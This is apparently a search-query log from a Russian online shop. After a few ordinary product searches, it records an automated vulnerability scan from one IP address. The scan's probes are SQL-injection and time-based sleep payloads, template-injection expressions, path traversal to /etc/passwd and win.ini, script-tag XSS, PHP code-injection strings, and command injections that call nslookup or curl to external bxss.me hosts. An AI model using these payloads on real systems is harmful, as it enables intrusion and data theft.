розетка накладная двойная	0	2024-04-02 23-55-22	178.78.11.36
розетка накладная	137	2024-04-02 23-55-26	178.78.11.36
3х6	14	2024-04-03 00-20-44	95.153.161.59
jjj11qqq	0	2024-04-03 01-31-13	94.190.105.14
${9898*323}	0	2024-04-03 01-31-19	94.190.105.14
батарейки	37	2024-04-03 01-31-20	94.190.105.14
ооо11ййй	0	2024-04-03 01-31-21	94.190.105.14
mr.	0	2024-04-03 01-31-24	94.190.105.14
${9898*323}	0	2024-04-03 01-31-24	94.190.105.14
батарейки	37	2024-04-03 01-31-25	94.190.105.14
1rvmmr9io	0	2024-04-03 01-31-26	94.190.105.14
{{3830*3830}}	0	2024-04-03 01-31-26	94.190.105.14
батарейки	37	2024-04-03 01-31-27	94.190.105.14
батарейкиtdkzeb4l	0	2024-04-03 01-31-29	94.190.105.14
батарейки	37	2024-04-03 01-31-29	94.190.105.14
батарейки' and 2*3*8=6*8 and '6r3l'='6r3l	0	2024-04-03 01-31-32	94.190.105.14
response.write(9090841*9378486)	0	2024-04-03 01-31-34	94.190.105.14
батарейки" and 2*3*8=6*8 and "85gf"="85gf	0	2024-04-03 01-31-34	94.190.105.14
*:*&fl=*,id:[value%20v='\u0036\u0036\u003697068954\u0039\u0039\u0039'],name:[value%20v='\u0036\u0036\u003697068954\u0039\u0039\u0039'],content:[value%20v='\u0036\u0036\u003697068954\u0039\u0039\u0039'],body:[value%20v='\u0036\u0036\u003697068954\u0039\u0039\u0039'],title:[value%20v='\u0036\u0036\u003697068954\u0039\u0039\u0039']&rows=1#	0	2024-04-03 01-31-35	94.190.105.14
eccmmfz3	0	2024-04-03 01-31-35	94.190.105.14
echo wvvgln$()\ bpkyqx\nz^xyu||a #' &echo wvvgln$()\ bpkyqx\nz^xyu||a #|" &echo wvvgln$()\ bpkyqx\nz^xyu||a #	0	2024-04-03 01-31-35	94.190.105.14
{{3830*3830}}	0	2024-04-03 01-31-35	94.190.105.14
../../../../../../../../../../../../../../etc/passwd	0	2024-04-03 01-31-35	94.190.105.14
'+response.write(9090841*9378486)+'	0	2024-04-03 01-31-36	94.190.105.14
батарейки%' and 2*3*8=6*8 and '0k0i'!='0k0i%	0	2024-04-03 01-31-36	94.190.105.14
батарейки<esi:include src="http://bxss.me/rpb.png"/>	0	2024-04-03 01-31-36	94.190.105.14
${9999128+9999384}	0	2024-04-03 01-31-36	94.190.105.14
батарейки	37	2024-04-03 01-31-36	94.190.105.14
-1 or 2+382-382-1=0+0+0+1	500	2024-04-03 01-31-37	94.190.105.14
"+response.write(9090841*9378486)+"	0	2024-04-03 01-31-37	94.190.105.14
../../../../../../../../../../../../../../windows/win.ini	0	2024-04-03 01-31-37	94.190.105.14
&echo wiiofm$()\ bnrluw\nz^xyu||a #' &echo wiiofm$()\ bnrluw\nz^xyu||a #|" &echo wiiofm$()\ bnrluw\nz^xyu||a #	0	2024-04-03 01-31-38	94.190.105.14
батарейки	37	2024-04-03 01-31-38	94.190.105.14
-1 or 3+382-382-1=0+0+0+1	500	2024-04-03 01-31-39	94.190.105.14
батарейки	37	2024-04-03 01-31-39	94.190.105.14
батарейки&echo nqlyxp$()\ vykvsa\nz^xyu||a #' &echo nqlyxp$()\ vykvsa\nz^xyu||a #|" &echo nqlyxp$()\ vykvsa\nz^xyu||a #	0	2024-04-03 01-31-40	94.190.105.14
батарейки	37	2024-04-03 01-31-40	94.190.105.14
-1 or 3*2<(0+5+382-382)	500	2024-04-03 01-31-42	94.190.105.14
|echo cansld$()\ awvgqv\nz^xyu||a #' |echo cansld$()\ awvgqv\nz^xyu||a #|" |echo cansld$()\ awvgqv\nz^xyu||a #	500	2024-04-03 01-31-42	94.190.105.14
../батарейки	37	2024-04-03 01-31-42	94.190.105.14
батарейки	37	2024-04-03 01-31-42	94.190.105.14
http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg	0	2024-04-03 01-31-44	94.190.105.14
батарейки|echo akidto$()\ cukwuj\nz^xyu||a #' |echo akidto$()\ cukwuj\nz^xyu||a #|" |echo akidto$()\ cukwuj\nz^xyu||a #	37	2024-04-03 01-31-44	94.190.105.14
-1 or 3*2>(0+5+382-382)	500	2024-04-03 01-31-44	94.190.105.14
батарейки	37	2024-04-03 01-31-44	94.190.105.14
батарейки&n976930=v957381	0	2024-04-03 01-31-45	94.190.105.14
1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs .jpg	0	2024-04-03 01-31-45	94.190.105.14
батарейки'||'	0	2024-04-03 01-31-46	94.190.105.14
батарейки	37	2024-04-03 01-31-46	94.190.105.14
$(nslookup -q=cname hitkxsttrgslyd7c46.bxss.me||curl hitkxsttrgslyd7c46.bxss.me)	0	2024-04-03 01-31-47	94.190.105.14
if(now()=sysdate(),sleep(15),0)	0	2024-04-03 01-31-47	94.190.105.14
батарейки	37	2024-04-03 01-31-47	94.190.105.14
http://bxss.me/t/fit.txt?.jpg	0	2024-04-03 01-31-48	94.190.105.14
&nslookup -q=cname hitjnacdewojl447b9.bxss.me&'\"`0&nslookup -q=cname hitjnacdewojl447b9.bxss.me&`'	0	2024-04-03 01-31-48	94.190.105.14
батарейки	37	2024-04-03 01-31-48	94.190.105.14
батарейки0'xor(if(now()=sysdate(),sleep(15),0))xor'z	0	2024-04-03 01-31-51	94.190.105.14
&(nslookup -q=cname hitlyvwyqfqra3e603.bxss.me||curl hitlyvwyqfqra3e603.bxss.me)&'\"`0&(nslookup -q=cname hitlyvwyqfqra3e603.bxss.me||curl hitlyvwyqfqra3e603.bxss.me)&`'	0	2024-04-03 01-31-52	94.190.105.14
/etc/shells	0	2024-04-03 01-31-52	94.190.105.14
батарейки	37	2024-04-03 01-31-52	94.190.105.14
батарейки0"xor(if(now()=sysdate(),sleep(15),0))xor"z	0	2024-04-03 01-31-53	94.190.105.14
батарейки	37	2024-04-03 01-31-53	94.190.105.14
|(nslookup -q=cname hitkdtyagzsoh74a70.bxss.me||curl hitkdtyagzsoh74a70.bxss.me)	0	2024-04-03 01-31-53	94.190.105.14
батарейки	37	2024-04-03 01-31-53	94.190.105.14
c:/windows/win.ini	0	2024-04-03 01-31-54	94.190.105.14
(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/	0	2024-04-03 01-31-54	94.190.105.14
батарейки	37	2024-04-03 01-31-55	94.190.105.14
`(nslookup -q=cname hittupxhxcrozdab21.bxss.me||curl hittupxhxcrozdab21.bxss.me)`	0	2024-04-03 01-31-55	94.190.105.14
батарейки	37	2024-04-03 01-31-55	94.190.105.14
bxss.me	0	2024-04-03 01-31-56	94.190.105.14
батарейки	37	2024-04-03 01-31-56	94.190.105.14
батарейки-1 waitfor delay '0:0:15' --	0	2024-04-03 01-31-59	94.190.105.14
батарейки	37	2024-04-03 01-31-59	94.190.105.14
;(nslookup -q=cname hitnqyefbsgsde68a2.bxss.me||curl hitnqyefbsgsde68a2.bxss.me)|(nslookup -q=cname hitnqyefbsgsde68a2.bxss.me||curl hitnqyefbsgsde68a2.bxss.me)&(nslookup -q=cname hitnqyefbsgsde68a2.bxss.me||curl hitnqyefbsgsde68a2.bxss.me)	0	2024-04-03 01-32-00	94.190.105.14
батарейки	37	2024-04-03 01-32-00	94.190.105.14
'.gethostbyname(lc('hitbw'.'fwvnnptr0a486.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(118).chr(68).chr(122).chr(88).'	0	2024-04-03 01-32-00	94.190.105.14
батарейки	37	2024-04-03 01-32-00	94.190.105.14
|(nslookup${ifs}-q${ifs}cname${ifs}hitsvngdmhxgw1d9cf.bxss.me||curl${ifs}hitsvngdmhxgw1d9cf.bxss.me)	0	2024-04-03 01-32-01	94.190.105.14
батарейки	37	2024-04-03 01-32-02	94.190.105.14
батарейкиflphntwk'; waitfor delay '0:0:15' --	0	2024-04-03 01-32-02	94.190.105.14
&(nslookup${ifs}-q${ifs}cname${ifs}hitjjpwalhtpm651f6.bxss.me||curl${ifs}hitjjpwalhtpm651f6.bxss.me)&'\"`0&(nslookup${ifs}-q${ifs}cname${ifs}hitjjpwalhtpm651f6.bxss.me||curl${ifs}hitjjpwalhtpm651f6.bxss.me)&`'	0	2024-04-03 01-32-02	94.190.105.14
".gethostbyname(lc("hitjd"."perhyzczc22d4.bxss.me."))."a".chr(67).chr(hex("58")).chr(119).chr(74).chr(121).chr(74)."	0	2024-04-03 01-32-02	94.190.105.14
батарейки	37	2024-04-03 01-32-02	94.190.105.14
gethostbyname(lc('hitms'.'sykmdyxt1ccb4.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(114).chr(75).chr(120).chr(79)	0	2024-04-03 01-32-04	94.190.105.14
батарейки	37	2024-04-03 01-32-04	94.190.105.14
батарейки8w6lhkpq' or 846=(select 846 from pg_sleep(15))--	0	2024-04-03 01-32-06	94.190.105.14
батарейки	37	2024-04-03 01-32-06	94.190.105.14
батарейки'&&sleep(27*1000)*udgeui&&'	0	2024-04-03 01-32-09	94.190.105.14
батарейки	37	2024-04-03 01-32-09	94.190.105.14
батарейки"&&sleep(27*1000)*acepjs&&"	0	2024-04-03 01-32-10	94.190.105.14
батарейки	37	2024-04-03 01-32-12	94.190.105.14
батарейки'||sleep(27*1000)*fclhdw||'	0	2024-04-03 01-32-12	94.190.105.14
батарейки	37	2024-04-03 01-32-13	94.190.105.14
;assert(base64_decode('chjpbnqobwq1kdmxmzm3ksk7'));	0	2024-04-03 01-32-13	94.190.105.14
батарейки	37	2024-04-03 01-32-13	94.190.105.14
';print(md5(31337));$a='	0	2024-04-03 01-32-15	94.190.105.14
батарейки"||sleep(27*1000)*rddmve||"	0	2024-04-03 01-32-15	94.190.105.14
батарейки	37	2024-04-03 01-32-15	94.190.105.14
";print(md5(31337));$a="	0	2024-04-03 01-32-17	94.190.105.14
батарейки'||dbms_pipe.receive_message(chr(98)||chr(98)||chr(98),15)||'	0	2024-04-03 01-32-18	94.190.105.14
батарейки	37	2024-04-03 01-32-18	94.190.105.14
батарейки'"	37	2024-04-03 01-32-21	94.190.105.14
${@print(md5(31337))}	0	2024-04-03 01-32-22	94.190.105.14
батарейки	37	2024-04-03 01-32-22	94.190.105.14
батарейки????%2527%2522\'\"	0	2024-04-03 01-32-24	94.190.105.14
${@print(md5(31337))}\	0	2024-04-03 01-32-24	94.190.105.14
батарейки	37	2024-04-03 01-32-24	94.190.105.14
@@bv6wg	0	2024-04-03 01-32-27	94.190.105.14
'.print(md5(31337)).'	0	2024-04-03 01-32-28	94.190.105.14
батарейки	37	2024-04-03 01-32-28	94.190.105.14
"+"a".concat(70-3).concat(22*4).concat(103).concat(80).concat(110).concat(81)+(require"socket"
socket.gethostbyname("hituv"+"kpgowexf21239.bxss.me.")[3].to_s)+"	0	2024-04-03 01-32-32	94.190.105.14
батарейки	37	2024-04-03 01-32-32	94.190.105.14
bxss.me/t/xss.html?%00	0	2024-04-03 01-32-32	94.190.105.14
батарейки	37	2024-04-03 01-32-32	94.190.105.14
'+'a'.concat(70-3).concat(22*4).concat(106).concat(90).concat(117).concat(88)+(require'socket'
socket.gethostbyname('hitrm'+'hdlfcbnif21ae.bxss.me.')[3].to_s)+'	0	2024-04-03 01-32-33	94.190.105.14
батарейки	37	2024-04-03 01-32-33	94.190.105.14
index.php	0	2024-04-03 01-32-35	94.190.105.14
'a'.concat(70-3).concat(22*4).concat(97).concat(71).concat(122).concat(84)+(require'socket'
socket.gethostbyname('hitra'+'mtkrxbrjd3ed5.bxss.me.')[3].to_s)	0	2024-04-03 01-32-35	94.190.105.14
батарейки	37	2024-04-03 01-32-35	94.190.105.14
index.php	0	2024-04-03 01-32-36	94.190.105.14
батарейки	37	2024-04-03 01-32-36	94.190.105.14
undefined	0	2024-04-03 01-32-37	94.190.105.14
батарейки	37	2024-04-03 01-32-37	94.190.105.14
index.php/.	0	2024-04-03 01-32-38	94.190.105.14
батарейки	37	2024-04-03 01-32-38	94.190.105.14
xfs.bxss.me	0	2024-04-03 01-32-51	94.190.105.14
батарейки	37	2024-04-03 01-32-51	94.190.105.14
909877	0	2024-04-03 01-32-53	94.190.105.14
батарейки	37	2024-04-03 01-32-53	94.190.105.14
http://xfs.bxss.me?yugkabel.ru	0	2024-04-03 01-32-54	94.190.105.14
батарейки	37	2024-04-03 01-32-54	94.190.105.14
<!--	6	2024-04-03 01-32-55	94.190.105.14
батарейки	37	2024-04-03 01-32-55	94.190.105.14
xfs.bxss.me?yugkabel.ru	0	2024-04-03 01-32-56	94.190.105.14
батарейки	37	2024-04-03 01-32-56	94.190.105.14
/\xfs.bxss.me?yugkabel.ru	0	2024-04-03 01-32-59	94.190.105.14
батарейки	37	2024-04-03 01-32-59	94.190.105.14
батарейки'"()&%<zzz><script >s5hg(9825)</script>	0	2024-04-03 01-33-00	94.190.105.14
батарейки	37	2024-04-03 01-33-00	94.190.105.14
'"()&%<zzz><script >s5hg(9231)</script>	0	2024-04-03 01-33-01	94.190.105.14
батарейки	37	2024-04-03 01-33-01	94.190.105.14
батарейки9217365	0	2024-04-03 01-33-03	94.190.105.14
батарейки	37	2024-04-03 01-33-03	94.190.105.14
mr.	0	2024-04-03 01-33-06	94.190.105.14
батарейки	37	2024-04-03 01-33-06	94.190.105.14
батарейки9217365<	0	2024-04-03 01-33-06	94.190.105.14
батарейки	37	2024-04-03 01-33-07	94.190.105.14
bfg10367?s1?s2?s3?hjl10367	0	2024-04-03 01-33-08	94.190.105.14
батарейки	37	2024-04-03 01-33-08	94.190.105.14
1e05kskco	0	2024-04-03 01-33-11	94.190.105.14
батарейки	37	2024-04-03 01-33-11	94.190.105.14
bfgx9414??z1??z2a?bcxhjl9414	0	2024-04-03 01-33-12	94.190.105.14
{{36349*36349}}	0	2024-04-03 01-33-12	94.190.105.14
батарейки	37	2024-04-03 01-33-13	94.190.105.14
mr.	0	2024-04-03 01-33-14	94.190.105.14
батарейки	37	2024-04-03 01-33-15	94.190.105.14
<%={{={@{#{${dfb}}%>	0	2024-04-03 01-33-15	94.190.105.14
батарейки	37	2024-04-03 01-33-15	94.190.105.14
mr.	0	2024-04-03 01-33-16	94.190.105.14
батарейки	37	2024-04-03 01-33-18	94.190.105.14
<th:t="${dfb}#foreach	0	2024-04-03 01-33-19	94.190.105.14
батарейки	37	2024-04-03 01-33-19	94.190.105.14
1}}"}}'}}1%>"%>'%><%={{={@{#{${dfb}}%>	0	2024-04-03 01-33-21	94.190.105.14
mr.g8rshkwj	0	2024-04-03 01-33-21	94.190.105.14
батарейки	37	2024-04-03 01-33-21	94.190.105.14
dfb{{98991*97996}}xca	0	2024-04-03 01-33-27	94.190.105.14
батарейки	37	2024-04-03 01-33-27	94.190.105.14
dfb[[${98991*97996}]]xca	0	2024-04-03 01-33-28	94.190.105.14
батарейки	37	2024-04-03 01-33-28	94.190.105.14
{{36349*36349}}	0	2024-04-03 01-33-29	94.190.105.14
батарейки	37	2024-04-03 01-33-30	94.190.105.14
dfb__${98991*97996}__::.x	0	2024-04-03 01-33-30	94.190.105.14
mr.	0	2024-04-03 01-33-30	94.190.105.14
батарейки	37	2024-04-03 01-33-32	94.190.105.14
-1 or 2+204-204-1=0+0+0+1 --	9	2024-04-03 01-33-33	94.190.105.14
"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")	0	2024-04-03 01-33-33	94.190.105.14
батарейки	37	2024-04-03 01-33-34	94.190.105.14
-1 or 3+204-204-1=0+0+0+1 --	9	2024-04-03 01-33-35	94.190.105.14
батарейки"onmouseover=s5hg(98012)"	0	2024-04-03 01-33-35	94.190.105.14
батарейки	37	2024-04-03 01-33-36	94.190.105.14
-1 щк 3*2б(0+5+204-204) --	0	2024-04-03 01-33-38	94.190.105.14
батарейки	37	2024-04-03 01-33-38	94.190.105.14
батарейки"onmouseover=s5hg(93632)"	0	2024-04-03 01-33-38	94.190.105.14
батарейки	37	2024-04-03 01-33-38	94.190.105.14
-1 щк 3*2ю(0+5+204-204) --	0	2024-04-03 01-33-39	94.190.105.14
батарейки	37	2024-04-03 01-33-39	94.190.105.14
-1 or 2+567-567-1=0+0+0+1	9	2024-04-03 01-33-43	94.190.105.14
батарейки	37	2024-04-03 01-33-43	94.190.105.14
-1 or 3+567-567-1=0+0+0+1	9	2024-04-03 01-33-45	94.190.105.14
батарейки	37	2024-04-03 01-33-49	94.190.105.14
-1 щк 3*2б(0+5+567-567)	0	2024-04-03 01-33-55	94.190.105.14
батарейки	37	2024-04-03 01-33-56	94.190.105.14
-1 щк 3*2ю(0+5+567-567)	0	2024-04-03 01-33-59	94.190.105.14
батарейки	37	2024-04-03 01-33-59	94.190.105.14
-1э щк 2+275-275-1=0+0+0+1 --	0	2024-04-03 01-34-00	94.190.105.14
батарейки	37	2024-04-03 01-34-00	94.190.105.14
*:*&fl=*,id:[value%20v='\u0036\u0036\u003691358221\u0039\u0039\u0039'],name:[value%20v='\u0036\u0036\u003691358221\u0039\u0039\u0039'],content:[value%20v='\u0036\u0036\u003691358221\u0039\u0039\u0039'],body:[value%20v='\u0036\u0036\u003691358221\u0039\u0039\u0039'],title:[value%20v='\u0036\u0036\u003691358221\u0039\u0039\u0039']&rows=1#	0	2024-04-03 01-34-05	94.190.105.14
батарейки	37	2024-04-03 01-34-05	94.190.105.14
response.write(9031166*9079409)	0	2024-04-03 01-34-05	94.190.105.14
-1э щк 3+275-275-1=0+0+0+1 --	0	2024-04-03 01-34-05	94.190.105.14
батарейки	37	2024-04-03 01-34-05	94.190.105.14
усрщ лплыйт$()\ чшсйфк\тя^чнг||ф #э &усрщ лплыйт$()\ чшсйфк\тя^чнг||ф #|э &усрщ лплыйт$()\ чшсйфк\тя^чнг||ф #	0	2024-04-03 01-34-06	94.190.105.14
-1' or 2+465-465-1=0+0+0+1 or '0jhtvlix'='	0	2024-04-03 01-34-06	94.190.105.14
'+response.write(9031166*9079409)+'	0	2024-04-03 01-34-06	94.190.105.14
батарейки	37	2024-04-03 01-34-07	94.190.105.14
-1э щк 2+612-612-1=0+0+0+1 --	0	2024-04-03 01-34-07	94.190.105.14
кямчи2ел	0	2024-04-03 01-34-07	94.190.105.14
&усрщ тасочт$()\ ккстты\тя^чнг||ф #э &усрщ тасочт$()\ ккстты\тя^чнг||ф #|э &усрщ тасочт$()\ ккстты\тя^чнг||ф #	0	2024-04-03 01-34-07	94.190.105.14
"+response.write(9031166*9079409)+"	0	2024-04-03 01-34-07	94.190.105.14
батарейки	37	2024-04-03 01-34-09	94.190.105.14
mr.	0	2024-04-03 01-34-09	94.190.105.14
-1э щк 3+612-612-1=0+0+0+1 --	0	2024-04-03 01-34-09	94.190.105.14
mr.	0	2024-04-03 01-34-09	94.190.105.14
mr.&echo jnnkcl$()\ llmcxd\nz^xyu||a #' &echo jnnkcl$()\ llmcxd\nz^xyu||a #|" &echo jnnkcl$()\ llmcxd\nz^xyu||a #	0	2024-04-03 01-34-09	94.190.105.14
mr.	0	2024-04-03 01-34-10	94.190.105.14
батарейки	37	2024-04-03 01-34-10	94.190.105.14
mr.	0	2024-04-03 01-34-11	94.190.105.14
|усрщ шгщчсщ$()\ рмерыа\тя^чнг||ф #э |усрщ шгщчсщ$()\ рмерыа\тя^чнг||ф #|э |усрщ шгщчсщ$()\ рмерыа\тя^чнг||ф #	118	2024-04-03 01-34-11	94.190.105.14
батарейки	37	2024-04-03 01-34-11	94.190.105.14
mr.'"	0	2024-04-03 01-34-11	94.190.105.14
../../../../../../../../../../../../../../etc/passwd	0	2024-04-03 01-34-14	94.190.105.14
батарейки	37	2024-04-03 01-34-14	94.190.105.14
mr.	0	2024-04-03 01-34-14	94.190.105.14
mr.|echo vwafop$()\ gpbtqb\nz^xyu||a #' |echo vwafop$()\ gpbtqb\nz^xyu||a #|" |echo vwafop$()\ gpbtqb\nz^xyu||a #	71	2024-04-03 01-34-14	94.190.105.14
батарейки	37	2024-04-03 01-34-15	94.190.105.14
mr.????%2527%2522\'\"	0	2024-04-03 01-34-15	94.190.105.14
../../../../../../../../../../../../../../windows/win.ini	0	2024-04-03 01-34-15	94.190.105.14
батарейки	37	2024-04-03 01-34-15	94.190.105.14
mr.	0	2024-04-03 01-34-15	94.190.105.14
батарейки	37	2024-04-03 01-34-16	94.190.105.14
@@n6sub	0	2024-04-03 01-34-16	94.190.105.14
батарейки	37	2024-04-03 01-34-16	94.190.105.14
$(nslookup -q=cname hitkblvyxtams6f99d.bxss.me||curl hitkblvyxtams6f99d.bxss.me)	0	2024-04-03 01-34-17	94.190.105.14
mr.	0	2024-04-03 01-34-17	94.190.105.14
батарейки	37	2024-04-03 01-34-20	94.190.105.14
mr.	0	2024-04-03 01-34-20	94.190.105.14
&nslookup -q=cname hitblczxwlhlh17a00.bxss.me&'\"`0&nslookup -q=cname hitblczxwlhlh17a00.bxss.me&`'	0	2024-04-03 01-34-20	94.190.105.14
батарейки	37	2024-04-03 01-34-20	94.190.105.14
../mr.	0	2024-04-03 01-34-21	94.190.105.14
батарейки	37	2024-04-03 01-34-22	94.190.105.14
&(nslookup -q=cname hitqrsisqbeyu82529.bxss.me||curl hitqrsisqbeyu82529.bxss.me)&'\"`0&(nslookup -q=cname hitqrsisqbeyu82529.bxss.me||curl hitqrsisqbeyu82529.bxss.me)&`'	0	2024-04-03 01-34-22	94.190.105.14
mr.<esi:include src="http://bxss.me/rpb.png"/>	0	2024-04-03 01-34-22	94.190.105.14
батарейки	37	2024-04-03 01-34-22	94.190.105.14
mr.	0	2024-04-03 01-34-24	94.190.105.14
батарейки	37	2024-04-03 01-34-24	94.190.105.14
mr.	0	2024-04-03 01-34-24	94.190.105.14
батарейки	37	2024-04-03 01-34-24	94.190.105.14
|(nslookup -q=cname hithcvpiidsrw5ebab.bxss.me||curl hithcvpiidsrw5ebab.bxss.me)	0	2024-04-03 01-34-24	94.190.105.14
mr.	0	2024-04-03 01-34-24	94.190.105.14
undefined	0	2024-04-03 01-34-24	94.190.105.14
mr.	0	2024-04-03 01-34-25	94.190.105.14
батарейки	37	2024-04-03 01-34-26	94.190.105.14
`(nslookup -q=cname hitdugisjzadk7a623.bxss.me||curl hitdugisjzadk7a623.bxss.me)`	0	2024-04-03 01-34-27	94.190.105.14
${9999742+10000354}	0	2024-04-03 01-34-27	94.190.105.14
mr.	0	2024-04-03 01-34-27	94.190.105.14
батарейки	37	2024-04-03 01-34-29	94.190.105.14
mr.	0	2024-04-03 01-34-30	94.190.105.14
;(nslookup -q=cname hituzcrzmauqad0ed5.bxss.me||curl hituzcrzmauqad0ed5.bxss.me)|(nslookup -q=cname hituzcrzmauqad0ed5.bxss.me||curl hituzcrzmauqad0ed5.bxss.me)&(nslookup -q=cname hituzcrzmauqad0ed5.bxss.me||curl hituzcrzmauqad0ed5.bxss.me)	0	2024-04-03 01-34-30	94.190.105.14
mr.	0	2024-04-03 01-34-30	94.190.105.14
батарейки	37	2024-04-03 01-34-31	94.190.105.14
mr.	0	2024-04-03 01-34-31	94.190.105.14
|(nslookup${ifs}-q${ifs}cname${ifs}hitjelihykawaa935b.bxss.me||curl${ifs}hitjelihykawaa935b.bxss.me)	0	2024-04-03 01-34-31	94.190.105.14
mr.	0	2024-04-03 01-34-31	94.190.105.14
батарейки	37	2024-04-03 01-34-32	94.190.105.14
http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.	0	2024-04-03 01-34-32	94.190.105.14
&(nslookup${ifs}-q${ifs}cname${ifs}hitghrsokapiz6640d.bxss.me||curl${ifs}hitghrsokapiz6640d.bxss.me)&'\"`0&(nslookup${ifs}-q${ifs}cname${ifs}hitghrsokapiz6640d.bxss.me||curl${ifs}hitghrsokapiz6640d.bxss.me)&`'	0	2024-04-03 01-34-32	94.190.105.14
mr.	0	2024-04-03 01-34-34	94.190.105.14
1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs .	0	2024-04-03 01-34-34	94.190.105.14
mr.	0	2024-04-03 01-34-35	94.190.105.14
батарейки	37	2024-04-03 01-34-35	94.190.105.14
mr.	0	2024-04-03 01-34-35	94.190.105.14
батарейки	37	2024-04-03 01-34-35	94.190.105.14
mr.	0	2024-04-03 01-34-51	94.190.105.14
http://bxss.me/t/fit.txt?.	0	2024-04-03 01-34-51	94.190.105.14
mr.	0	2024-04-03 01-34-51	94.190.105.14
батарейки	37	2024-04-03 01-34-51	94.190.105.14
mr.	0	2024-04-03 01-34-55	94.190.105.14
/etc/shells	0	2024-04-03 01-34-55	94.190.105.14
mr.	0	2024-04-03 01-34-55	94.190.105.14
c:/windows/win.ini	0	2024-04-03 01-35-13	94.190.105.14
батарейки	37	2024-04-03 01-35-13	94.190.105.14
mr.	0	2024-04-03 01-35-13	94.190.105.14
mr.&n923013=v985822	0	2024-04-03 01-35-13	94.190.105.14
батарейки	37	2024-04-03 01-35-13	94.190.105.14
mr.	0	2024-04-03 01-35-20	94.190.105.14
ичыыюьу	0	2024-04-03 01-35-20	94.190.105.14
mr.	0	2024-04-03 01-35-20	94.190.105.14
батарейки	37	2024-04-03 01-35-20	94.190.105.14
mr.	0	2024-04-03 01-35-32	94.190.105.14
батарейки	37	2024-04-03 01-35-33	94.190.105.14
mr.	0	2024-04-03 01-35-34	94.190.105.14
батарейки	37	2024-04-03 01-35-36	94.190.105.14
mr.	0	2024-04-03 01-35-36	94.190.105.14
батарейки	37	2024-04-03 01-35-38	94.190.105.14
mr.	0	2024-04-03 01-35-38	94.190.105.14
батарейки	37	2024-04-03 01-35-38	94.190.105.14
mr.	0	2024-04-03 01-35-54	94.190.105.14
батарейки	37	2024-04-03 01-35-54	94.190.105.14
mr.	0	2024-04-03 01-35-54	94.190.105.14
батарейки	37	2024-04-03 01-35-54	94.190.105.14
mr.	0	2024-04-03 01-35-55	94.190.105.14
батарейки	37	2024-04-03 01-35-57	94.190.105.14
mr.	0	2024-04-03 01-35-57	94.190.105.14
батарейки	37	2024-04-03 01-35-58	94.190.105.14
mr.	0	2024-04-03 01-36-02	94.190.105.14
undefined	0	2024-04-03 01-36-02	94.190.105.14
mr.	0	2024-04-03 01-36-02	94.190.105.14
батарейки	37	2024-04-03 01-36-03	94.190.105.14
mr.	0	2024-04-03 01-36-03	94.190.105.14
батарейки	37	2024-04-03 01-36-06	94.190.105.14
mr.	0	2024-04-03 01-36-06	94.190.105.14
батарейки	37	2024-04-03 01-36-06	94.190.105.14
mr.'&&sleep(27*1000)*ytqjsh&&'	0	2024-04-03 01-36-07	94.190.105.14
mr.	0	2024-04-03 01-36-07	94.190.105.14
'.gethostbyname(lc('hitgt'.'mlusgzip1a812.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(116).chr(76).chr(99).chr(78).'	0	2024-04-03 01-36-07	94.190.105.14
mr.	0	2024-04-03 01-36-07	94.190.105.14
mr."&&sleep(27*1000)*vkqnbj&&"	0	2024-04-03 01-36-08	94.190.105.14
mr.	0	2024-04-03 01-36-08	94.190.105.14
".gethostbyname(lc("hitqg"."casjleikd3c85.bxss.me."))."a".chr(67).chr(hex("58")).chr(121).chr(87).chr(106).chr(73)."	0	2024-04-03 01-36-08	94.190.105.14
батарейки	37	2024-04-03 01-36-08	94.190.105.14
mr.	0	2024-04-03 01-36-08	94.190.105.14
mr.'||sleep(27*1000)*wycykq||'	0	2024-04-03 01-36-08	94.190.105.14
;assert(base64_decode('chjpbnqobwq1kdmxmzm3ksk7'));	0	2024-04-03 01-36-09	94.190.105.14
батарейки	37	2024-04-03 01-36-09	94.190.105.14
mr."||sleep(27*1000)*zjtavo||"	0	2024-04-03 01-36-16	94.190.105.14
